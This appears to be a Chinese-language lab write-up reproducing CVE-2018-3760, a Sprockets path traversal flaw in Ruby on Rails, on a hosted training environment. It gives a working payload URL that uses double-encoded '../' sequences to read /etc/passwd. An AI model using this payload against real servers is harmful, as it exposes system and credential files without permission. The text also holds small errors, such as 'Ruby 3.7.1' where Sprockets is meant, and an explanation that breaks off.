# Ruby On Rails 任意文件读取(CVE-2018-3760)

## 漏洞介绍

Ruby On Rails是一个著名的Ruby Web开发框架，它使用链轮作为开发环境中的静态文件服务器。Sprockets是一个编译和分发静态资源文件的Ruby库。
在Ruby 3.7.1和更低版本中，存在由辅助解码引起的路径遍历漏洞。攻击者可以使用%252e%252e/访问根目录并读取或执行目标服务器上的任何文件。

## 漏洞原理

问题出在sprockets，它用来检查 JavaScript 文件的相互依赖关系，用以优化网页中引入的js文件，以避免加载不必要的js文件。
当访问如http://127.0.0.1:3000/assets/foo.js时，会进入server.rb:
rorbidden_request用来对path进行检查，是否包含…以防止路径穿越，是否是绝对路径：

## 影响版本

4.0.0.beta7及更低版本
3.7.1及更低版本
2.12.4及更低版本。

## 复现流程

**1. 环境搭建**

这里使用墨者学院搭建好的环境，路径为：

https://www.mozhe.cn/bug/detail/S3BWYmVtWWhLSHFmclZOVXlhZE9Gdz09bW96aGUmozhe

**2.流程**

直接访问`http://219.153.49.228:49883/assets/file:%2f%2f/etc/passwd`，将会报错，因为文件`/etc/passwd`不在允许的目录中

![image-20200527213518894](CVE-2018-3760.assets/image-20200527213518894.png)

我们通过报错页面，可以获得允许的目录列表。随便选择其中一个目录，如`/usr/src/blog/app/assets/images`，然后使用`%252e%252e/`向上一层跳转，最后读取`/etc/passwd`：

```
http://219.153.49.228:49883/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
```

![image-20200527213414355](CVE-2018-3760.assets/image-20200527213414355.png)

## 参考文献

1. [CVE-2018-3760漏洞复现(任意文件读取)](https://www.pianshen.com/article/9643810542/)
2. [Vulhub - Ruby On Rails 路径穿越漏洞（CVE-2018-3760）复现](https://blog.csdn.net/qq_42357070/article/details/83545100)